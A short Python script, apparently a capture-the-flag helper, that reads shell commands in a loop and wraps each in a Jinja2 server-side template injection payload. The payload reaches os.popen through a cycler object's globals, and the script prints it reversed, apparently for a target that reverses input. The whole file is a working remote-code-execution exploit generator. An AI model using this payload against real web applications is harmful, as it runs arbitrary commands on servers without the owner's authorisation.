import readline

while True:
    cmd = input('> ')
    cmd = f"{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{cmd}').read() }}}}"
    print(cmd[::-1])
